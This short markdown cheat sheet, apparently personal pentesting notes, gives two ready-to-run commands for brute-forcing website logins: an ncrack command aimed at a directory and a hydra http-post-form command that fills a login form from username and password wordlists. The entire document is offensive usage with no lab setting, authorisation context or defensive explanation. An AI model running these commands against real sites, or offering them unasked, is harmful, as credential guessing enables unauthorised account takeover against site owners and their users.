# Brute force attacks

## With ncrack (simpler and easier to configure)

```
ncrack website.com -g path=/directory -U logins.txt -P passwords.txt
```

## With hydra (more advanced and more powerful)

```
hydra website.com http-post-form "/:login=^USER^&password=^PASS^:F=Wrong" -L logins.txt -P passwords.txt
```
